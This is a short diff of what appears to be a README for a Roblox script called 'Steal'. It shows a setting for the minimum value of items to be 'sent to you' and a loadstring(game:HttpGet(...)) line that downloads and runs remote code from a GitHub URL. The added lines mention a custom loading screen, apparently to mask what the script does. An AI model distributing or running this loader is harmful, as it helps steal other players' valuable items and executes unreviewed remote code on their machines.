@@ -17,3 +17,5 @@ min_rap = 2000000 -- minimum rap of each item you want to get sent to you. 2 mil
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Cezar-Very-Epic/Steal/main/StealScript"))()
 ```
+
+You can also check Steal Custom Loadingscreen if you want to make your own loadingscreen (only do that if you have coding experience) or no loadingscreen at all (not recomanded).
